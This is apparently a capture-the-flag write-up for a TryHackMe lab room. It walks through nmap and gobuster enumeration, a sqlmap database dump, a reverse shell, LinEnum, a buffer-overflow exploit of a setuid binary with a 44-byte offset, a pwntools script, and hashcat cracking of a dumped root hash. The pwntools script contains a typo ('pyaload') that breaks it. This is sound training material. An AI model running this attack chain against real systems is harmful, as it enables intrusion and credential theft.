# Room
https://tryhackme.com/room/thecodcaper

# Task 1 - Deploy
Deploy VM

# Task 2 - Enumeration
Use nmap to grab info on the target host
```
nmap -A -T4 10.10.210.146 | tee nmap.txt
```

# Task 3 - Web Enumeration
Use gobuster to enumerate the web server
```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.210.146 -t 40 -x php,txt,html
```

# Task 4 - Web Exploitation
Use sqlmap to attack the web page you found above
```
sqlmap -u http://10.10.210.146/administrator.php --forms --dump
```

# Task 5 - Command Execution
Login to the web page using the credentials from the database dump you found above.  Start a listener and execute a reverse shell from within the PHP command form
```
https://weibell.github.io/reverse-shell-generator/
```

After a shell is launched, search for files pertaining to a specific user
```
find / -type f -user www-data 2>/dev/null
```

# Task 6 - Enumeration with LinEnum
Copy LinEnum to the target using the new login credentials you found above
```
scp LinEnum.sh pingu@1.2.3.4:LinEnum.sh
```
Login to the host with the credentials and then change LinEnum.sh to be an executable file
```
chmod +x LinEnum.sh
```
Run LinEnum
```
./LinEnum.sh | tee le.txt
```
Review the output and pay attention to anything out of the ordinary

# Task 7 - pwndbg
Start pwndbg and point it to the out of place file you found above
```
gdb /opt/secret/root
```
Pass 50 characters worth of cyclic input to the program
```
r < <(cyclic 50)
```
In the backtrace output, you'll see an address that faults
```
───────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────
 ► f 0 6161616c
   f 1 f700616d
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Program received signal SIGSEGV (fault address 0x6161616c)
```
To find how many characters you need to overwrite the EIP
```
pwndbg> cyclic -l 0x6161616c
44
```

# Task 8 - Binary Exploitation - Manual
In the same pwndbg session from the last task, run disassemble shell to find the shell function memory address
```
pwndbg> disassemble shell
Dump of assembler code for function shell:
   0x080484cb <+0>:     push   ebp
   0x080484cc <+1>:     mov    ebp,esp
   0x080484ce <+3>:     sub    esp,0x8
   0x080484d1 <+6>:     sub    esp,0xc
   0x080484d4 <+9>:     push   0x3e8
   0x080484d9 <+14>:    call   0x80483a0 <setuid@plt>
   0x080484de <+19>:    add    esp,0x10
   0x080484e1 <+22>:    sub    esp,0xc
   0x080484e4 <+25>:    push   0x3e8
   0x080484e9 <+30>:    call   0x8048370 <setgid@plt>
   0x080484ee <+35>:    add    esp,0x10
   0x080484f1 <+38>:    sub    esp,0xc
   0x080484f4 <+41>:    push   0x80485d0
   0x080484f9 <+46>:    call   0x8048380 <system@plt>
   0x080484fe <+51>:    add    esp,0x10
   0x08048501 <+54>:    nop
   0x08048502 <+55>:    leave  
   0x08048503 <+56>:    ret    
End of assembler dump.
```
* In this case the specific address is 0x080484cb
* Convert this address to little endian using Python while submitting 44 characters and pipe to the program
```
pingu@ubuntu:~$ python -c 'import struct;print "A"*44 + struct.pack("<I",0x080484cb)' | /opt/secret/root
root:$6$rFK4s/vE$zkh2/RBiRZ746
...
...
...
...
Segmentation fault
```

# Task 9 - Binary Exploitation - pwntools
Create a pwntools program with Python to do the same thing
```
from pwn import *
proc = process('/opt/secret/root')
elf = ELF('/opt/secret/root')
shell_func = elf.symbols.shell
payload = fit({
    44: shell_func
})
proc.sendline(pyaload)
proc.interactive()
```

# Task 10 - Crack the hash
Crack the root user hash with hashcat
```
 .\hashcat.exe -m 1800 -a 0 .\tc.txt .\rockyou.txt
```
* Resources
  * https://hashcat.net/wiki/doku.php?id=example_hashes

# Task 11 - Conclusion
Conclusion
* Resources
  * https://docs.pwntools.com/en/stable/
  * https://browserpwndbg.readthedocs.io/en/docs/

